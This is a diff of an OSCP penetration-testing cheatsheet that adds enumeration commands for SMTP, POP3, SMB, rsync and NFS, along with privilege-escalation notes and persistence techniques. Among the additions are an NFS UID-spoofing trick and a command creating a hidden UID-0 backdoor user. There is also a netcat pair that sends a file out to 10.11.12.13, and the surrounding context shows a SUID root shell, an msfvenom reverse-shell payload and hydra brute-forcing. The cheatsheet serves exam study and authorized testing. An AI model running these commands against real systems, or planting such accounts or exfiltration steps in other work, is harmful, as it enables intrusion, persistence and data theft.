@@ -1,6 +1,13 @@
 ## OSCP Cheatsheet
 **Author:** Victor Fernandez III
 
+### Table of Contents
+* [Reconnaissance](#reconnaissance)
+* [Enumeration](#enumeration)
+* [Gaining Access](#gaining-access)
+* [Maintaining Access](#maintaining-access)
+* [Covering Tracks](#covering-tracks)
+
 ### Reconnaissance
 | Network ID | Subnet Mask | Default Gateway | Computers |
 | ---------- | ----------- | --------------- | ---------------- |
@@ -115,12 +122,20 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
 ```
 
 #### SMTP
+Manual enumeration
 ```bash
-sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$NAME-nmap-scripts-smtp-commands
+telnet $TARGET 25
+HELO
+VRFY root
+QUIT
 ```
 
 ```bash
-sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$NAME-nmap-scripts-smtp-enum-users
+sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$TARGET-nmap-scripts-smtp-commands
+```
+
+```bash
+sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$TARGET-nmap-scripts-smtp-enum-users
 ```
 
 ```bash
@@ -130,7 +145,6 @@ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TAR
 Automated enumeration of exploitable SMTP vulnerabilities.
 ```bash
 sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
-# replace the lines above with the actual scan results
 ```
 
 #### HTTP
@@ -139,6 +153,8 @@ sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-htt
 ```
 
 ```bash
+dirb http://$TARGET 
+dirb http://$TARGET:$PORT/ -o scans/$TARGET-dirb-$PORT-common
 dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
 ```
 
@@ -147,14 +163,46 @@ dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
 ```
 
 ```bash
+nikto -h $TARGET -T 2 # scan for misconfiguration vulnerabilities
+nikto -h $TARGET -T 9 # scan for SQL injection vulnerabilities
+```
+
+```bash
 nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80
+```
+
+```bash
+# Tuning (-T) Options
+0 – File Upload
+1 – Interesting File / Seen in logs
+2 – Misconfiguration / Default File
+3 – Information Disclosure
+4 – Injection (XSS/Script/HTML)
+5 – Remote File Retrieval – Inside Web Root
+6 – Denial of Service
+7 – Remote File Retrieval – Server Wide
+8 – Command Execution / Remote Shell
+9 – SQL Injection
+a – Authentication Bypass
+b – Software Identification
+c – Remote Source Inclusion
+x – Reverse Tuning Options (i.e., include all except specified)
+```
+
+#### POP3 
+```bash
+telnet $TARGET 110
+USER root
+PASS root
+RETR 1
+QUIT
 ```
 
 #### RPC
 ```bash
 rpcclient -U '' $TARGET
 srvinfo
-netshareenum
+netshareenum # print the real file-path of shares; good for accurate RCE
 ```
 
 #### NetBIOS
@@ -165,12 +213,20 @@ nbtscan $TARGET
 #### SMB
 The following SMB shares were discovered using Smbclient.
 ```bash
-smbclient -L $TARGET
+smbclient -L //$TARGET/ # list shares
+smbclient -L //$TARGET/ -p $PORT # specify non-standard SMB/Samba port
 ```
 
 The SMB shares discovered have the following permissions.
 ```bash
 smbmap -H $TARGET
+smbmap -H $TARGET
+smbmap -H $TARGET -P $PORT
+```
+
+```bash
+smbget -R smb://$TARGET/$SHARE
+smbget -R smb://$TARGET:$PORT/$SHARE
 ```
 
 Download files.
@@ -190,6 +246,26 @@ The target is NOT vulnerable to SambaCry.
 ```bash
 # check if vulnerable to SambaCry
 sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
+```
+
+#### Rsync
+```bash
+sudo nmap $TARGET -p873 --script rsync-list-modules
+rsync -av rsync://$TARGET/$SHARE --list-only
+rsync -av rsync://$TARGET/$SHARE loot
+```
+
+#### NFS
+```bash
+sudo nmap $TARGET -p111 --script-nfs* 
+showmount -e $TARGET 
+
+sudo mkdir /mnt/FOO
+sudo mount //$TARGET:/$SHARE /mnt/FOO
+
+sudo adduser demo
+sudo sed -i -e 's/1001/5050/g' /etc/passwd
+cat /mnt/FOO/loot.txt
 ```
 
 #### SQL
@@ -216,6 +292,12 @@ SELECT pg_ls_dir('/');
 #### WinRM
 ```bash
 evil-winrm -u $USER -p $PASSWORD -i $TARGET
+```
+
+
+### IRC
+```bash
+irssi -c $TARGET -p $PORT
 ```
 
 ### Gaining Access
@@ -281,6 +363,24 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshe
 ```
 
 ### Maintaining Access
+#### Information to Gather for Privilege Escalation
+| Information | Benefit to Privilege Escalation |
+| ----------- | ------------------------------- |
+| User Context |Establish who you are before working towards who you want to be. |
+| Hostname | Discover the system’s role, naming convention, OS, etc. |
+| OS Version | Find matching kernel exploits. |
+| Kernel Version | Find matching kernel exploits (exploit the core of the OS). |
+| System Architecture | Find matching exploits. |
+| Processes and Services | Determine which are running under a privilege account and vulnerable to a known exploit and/or configured with weak permissions. |
+| Network Information | Identify pivot options to other machines/networks (adapter configs, routes, TCP connections and their process owners), and determine if anti-virus or virtualization software is running. |
+| Firewall Status and Rules | Determine if a service blocked remotely is allowed via loopback; find rules that allow any inbound traffic. |
+| Scheduled Tasks | Identify automated tasks running under an administrator-context; find file-paths to files with weak permissions. |
+| Programs and Patch Levels | Find matching exploits; HotFixId and InstalledOn represent quality of patch mgmt; qfe = quick fix engineering. |
+| Readable/Writable Files and Directories | Find credentials and/or files (that run under a privileged account) that can be modified/overwritten: look for files readable and/or writable by “Everyone,” groups you’re part of, etc. |
+| Unmounted Drives | Find credentials. | 
+| Device Drivers and Kernel Modules | Find matching exploits. |
+| AutoElevate Settings and Binaries | Find settings and/or files that run as the file owner when invoked. If AlwaysInstallElevated is enabled, exploit via a malicious .msi file. |
+
 #### Linux Privilege Escalation
 ```bash
 whoami
@@ -301,6 +401,7 @@ whoami
 whoami /priv
 net user
 systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 dir c:\
 wmic service get name,startname
 cd "c:\program files"
@@ -310,6 +411,11 @@ cacls *.exe
 ```
 
 #### Persistence  
+Add a new user
+```bash
+useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
+```
+
 Rootbash (Credit: Tib3rius)
 ```bash
 # as root, create a copy of BASH and then set the SUID-bit
@@ -321,6 +427,17 @@ cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tm
 Add a new user to a SQL database
 ```sql
 INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
+```
+
+Exfil via Netcat
+```bash
+nc -nvlp 5050 > stolen.exe
+nc.exe -w3 10.11.12.13 5050 < stealme.exe
+```
+
+### Covering Tracks
+```bash
+# techniques go here :)
 ```
 
 ## References
